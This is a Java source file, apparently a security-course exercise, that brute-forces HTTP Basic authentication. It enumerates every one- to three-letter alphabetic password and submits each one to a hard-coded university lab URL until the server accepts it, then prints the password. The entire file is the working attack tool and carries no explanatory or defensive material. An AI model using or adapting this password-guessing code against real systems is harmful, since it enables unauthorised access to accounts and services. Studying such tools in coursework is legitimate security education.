import java.util.*;
import java.net.*;
import java.io.*;

public class BruteForce
{
    boolean connected = false;
    int counter;
    String[] chars = {"a","b","c","d","e","f","g","h",
                    "i","j","k","l","m","n","o","p",
                    "q","r","s","t","u","v","w","x",
                    "y","z","A","B","C","D","E","F",
                    "G","H","I","J","K","L","M","N",
                    "O","P","Q","R","S","T","U","V",
                    "W","X","Y","Z"};
    Vector combinations = new Vector();
    
    BruteForce()
    {
        counter = 0;
        this.genCombinations();
        this.startAttack();
    }   
    
    public void startAttack()
    {
        while(counter<this.combinations.size())
        {
           connected = sendRequest();
           if(connected == true)
           {
             System.out.print("The password is: ");
             System.out.println((String)combinations.elementAt(counter-1));
             counter = combinations.size();
           }
        }
    }
    
    public void genCombinations()
    {
        String combination = new String();
        
        for (int x=0; x<52; x++)
        {
            combination = chars[x];
            this.combinations.addElement(combination);
        }
        
        for (int x=0; x<52; x++)
        {
            for (int y=0; y<52; y++)
            {
                combination = chars[x] + chars[y];
                this.combinations.addElement(combination);
            }
        }   
        
        for (int x=0; x<52; x++)
        {
            for (int y=0; y<52; y++)
            {
                for (int z=0; z<52; z++)
                {
                    combination = chars[x] + chars[y] + chars[z];
                    this.combinations.addElement(combination);
                }
            }
        }   
    }
    
    public boolean sendRequest()
    {
        Authenticator.setDefault (new MyAuthenticator ());
        try 
        {
        	
        	URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
                HttpURLConnection urlConn = (HttpURLConnection)url.openConnection();
                urlConn.connect();
               if(urlConn.getResponseMessage().equalsIgnoreCase("OK"))
               {
                   return true;
               }
               
        } 
        catch (IOException e) {}
        
        return false;
    }
    
     public static void main(String [] args)
     {
         BruteForce bf = new BruteForce();
     }
   
   
     class MyAuthenticator extends Authenticator {
       
        protected PasswordAuthentication getPasswordAuthentication() {
            String username = "";
            String password = (String)combinations.elementAt(counter);
            counter++;
            return new PasswordAuthentication(username, password.toCharArray());
        }
    }
}
